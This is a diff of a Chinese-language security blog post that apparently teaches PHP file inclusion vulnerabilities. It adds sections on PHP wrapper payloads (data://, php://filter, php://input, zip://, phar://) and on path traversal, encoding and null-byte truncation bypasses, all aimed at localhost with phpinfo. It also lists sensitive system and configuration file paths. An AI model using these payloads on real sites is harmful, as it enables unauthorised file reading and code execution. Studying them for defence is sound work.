@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">509</span>
+            <span class="post-count">1.1k</span>
         </span>
     </span>
 
@@ -94,7 +94,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -109,13 +109,15 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
-<h4 id="文件包含常用函数"><a href="#文件包含常用函数" class="headerlink" title="文件包含常用函数"></a>文件包含常用函数</h4><p>include():找不到被包含的文件时会产生致命错误，并停止脚本运行</p>
+  <h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<h4 id="文件包含常用函数"><a href="#文件包含常用函数" class="headerlink" title="文件包含常用函数"></a>文件包含常用函数</h4><blockquote>
+<p>include():找不到被包含的文件时会产生致命错误，并停止脚本运行</p>
 <p>require():找不到被包含的错误时只会产生警告，脚本将继续运行</p>
 <p>include_once():与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</p>
 <p>require_once():与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</p>
+</blockquote>
 <h4 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h4><h5 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h5><p>本地文件包含就是通过浏览器包含web服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格过滤允许遍历目录的字符注入浏览器并执行</p>
-<h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞</p>
+<h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞</p>
 <p>注：本地文件包含与远程文件包含有着相同的原理，但前者只能包含本地服务器上存在的文件，而后者可以包含远程服务器上的文件</p>
 <h4 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h4><h5 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h5><blockquote>
 <p>c:\boot.ini // 查看系统版本</p>
@@ -134,6 +136,40 @@
 <p>/etc/httpd/conf/httpd.conf // Apache配置文件</p>
 <p>/etc/my.conf // mysql 配置文件</p>
 </blockquote>
+<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h5><p>常用于读取本地文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><p>读取数据流<br>条件：<code>allow_url_fopen:on</code> ;<code>allow_url_include :on</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">http://127.0.0.1/test.php?cmd=data://text/plain;base64,PD9waHANCiBwaHBpbmZvKCk7IA0KPz4=(只在php版本小于5.3时成功过)</span><br></pre></td></tr></table></figure>
+
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h5><p>访问压缩包里的文件<br><em>注：zip://后面只能使用绝对路径</em><br><em>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23</em><br><em>只需要是zip的压缩包即可，后缀名可以任意更改</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=zip://C:\phpStudy\PHPTutorial\WWW\test.zip%23phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>与zip://类似，区别在phar中相对路径和绝对路径都可以使用<br><em>注：php版本需大于5.3</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=phar://test.zip/phpinfo.php</span><br><span class="line">http://127.0.0.1/test.php?cmd=phar://C:\phpStudy\PHPTutorial\WWW\test.zip\phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>读取指定文件源码<br>例如用base64加密读取phpinfo.php的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/test.php?cmd=php://filter/read=convert.base64-encode/resource=C:\phpStudy\PHPTutorial\WWW\phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>访问各个输入流<br>条件：<code>allow_url_include :on</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=php://input</span><br></pre></td></tr></table></figure>
+
+<p>步骤:先访问该网址，然后bp抓包，最下面添加<code>&lt;?php phpinfo();?&gt;</code>，放包</p>
+<p><em>注</em>：除了data://和php://input，其他的伪协议都不受allow_url_fopen和allow_url_include控制</p>
+<h4 id="文件包含绕过"><a href="#文件包含绕过" class="headerlink" title="文件包含绕过"></a>文件包含绕过</h4><h5 id="指定前缀绕过"><a href="#指定前缀绕过" class="headerlink" title="指定前缀绕过"></a>指定前缀绕过</h5><h6 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h6><p>使用 ../../ 来返回上一目录，被称为目录遍历</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/../../../phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<h6 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h6><p>base64编码,url编码<br>例如用url编码绕过../</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/%2e%2e/phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="指定后缀绕过"><a href="#指定后缀绕过" class="headerlink" title="指定后缀绕过"></a>指定后缀绕过</h5><h6 id="url绕过"><a href="#url绕过" class="headerlink" title="url绕过"></a>url绕过</h6><p>在url后面加上?,#,空格<br>原理：利用query(?),fragment(#),空格来绕过后缀限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpinfo.php?</span><br><span class="line">http://127.0.0.1/phpinfo.php%23</span><br><span class="line">http://127.0.0.1/phpinfo.php%20</span><br></pre></td></tr></table></figure>
+
+<h6 id="00字符截断"><a href="#00字符截断" class="headerlink" title="00字符截断"></a>00字符截断</h6><p>条件:<code>magic_quotes_gpc:off</code>，php版本&lt;5.3.4</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=phpinfo.php%00</span><br></pre></td></tr></table></figure>
+
+<h6 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h6><p>不断的重复 ./，指定的后缀会在达到最大值后会被直接丢弃掉<br>条件:php版本&lt;5.2.8<br>在windows中，点号需要长于256；linux需要长于4096</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?cmd=./././... ... ././phpinfo.php</span><br></pre></td></tr></table></figure>
  
       <!-- reward -->
       
